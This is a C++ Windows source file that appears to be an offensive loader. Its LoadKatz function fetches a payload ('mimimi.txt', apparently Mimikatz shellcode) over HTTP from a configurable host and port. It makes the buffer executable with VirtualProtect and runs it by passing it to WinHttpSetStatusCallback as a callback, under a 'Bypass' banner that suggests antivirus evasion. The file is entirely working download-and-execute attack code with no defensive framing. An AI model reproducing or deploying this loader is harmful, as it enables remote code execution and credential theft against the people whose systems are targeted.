#define _CRT_SECURE_NO_DEPRECATE
#include<iostream>
#include<Windows.h>
#include<winhttp.h>
#pragma comment(lib,"Winhttp.lib")

using namespace std;

VOID LoadKatz(LPCWSTR PATH, DWORD PORT, LPCWSTR URL) {

	DWORD dwSize = 0;

	WCHAR* lpOutBuffer = NULL;
	HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

	BOOL  bResults = FALSE;

	hSession = WinHttpOpen(L"User Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession)
	{
		cout << "[*] WinHttpOpen Success" << endl;
		hConnect = WinHttpConnect(hSession, URL, PORT, 0);
	}
	else { cout << "[*] WinHttpOpen Error" << endl; exit(1); }

	if (hConnect)
	{
		cout << "[*] WinHttpConnect Success" << endl;
		hRequest = WinHttpOpenRequest(hConnect, L"GET", PATH, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	}
	else { cout << "[*] WinHttpConnect Error" << endl; exit(1); }

	if (hRequest)
	{
		cout << "[*] WinHttpOpenRequest Success" << endl;
		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
	}
	else { cout << "[*] WinHttpOpenRequest Error" << endl; exit(1); }

	if (bResults)
	{
		cout << "[*] WinHttpSendRequest Success" << endl;
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	}
	else { cout << "[*] WinHttpSendRequest Error" << endl; exit(1); }

	if (bResults)
	{
		cout << "[*] WinHttpReceiveRequest Success" << endl;
	}
	else { cout << "[*] WinHttpReceiveRequest Error" << endl; exit(1); }
	DWORD dwDownloaded = 0;
	char* pszOutBuffer;
	if (bResults)
	{
		do
		{
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}
			if (!dwSize)
				break;
			dwSize = dwSize * 4000;
			pszOutBuffer = new char[dwSize];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				break;
			}

			ZeroMemory(pszOutBuffer, dwSize);

			if (!WinHttpReadData(hRequest, pszOutBuffer,
				dwSize, &dwDownloaded))
			{
				printf("Error %u in WinHttpReadData.\n", GetLastError());
			}
			else
			{
				cout << "[*] Loading" << endl;

				DWORD ppp;
				VirtualProtect(pszOutBuffer, dwSize, PAGE_EXECUTE_READWRITE, &ppp);
				HINTERNET hopen = WinHttpOpen(L"User", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
				WINHTTP_STATUS_CALLBACK callback = WinHttpSetStatusCallback(hopen, (WINHTTP_STATUS_CALLBACK)pszOutBuffer, WINHTTP_CALLBACK_FLAG_HANDLES, NULL);
				if (callback == WINHTTP_INVALID_STATUS_CALLBACK) {
					cout << "[*] WinHttpSetStatusCallback Error" << endl;
					exit(1);
				}

				cout << "[*] Load Success  " << endl << endl;
				WinHttpCloseHandle(hopen);

			}

			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
	}
	else
	{
		cout << "[*] Error " << GetLastError() << "has occurred." << endl;
	}
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

}


void Load_exe(LPCWSTR ip, LPCWSTR path, int port) {
	cout << endl << "\t---[*][*] Bypass [*][*]---" << endl << endl;
	LoadKatz(path, port, ip);
}

int wmain(int argc, WCHAR* argv[]) {

	LPCWSTR ip = L"127.0.0.1";
	LPCWSTR file = L"mimimi.txt";
	int port = 80;
	Load_exe(ip, file, port);
	return 0;

}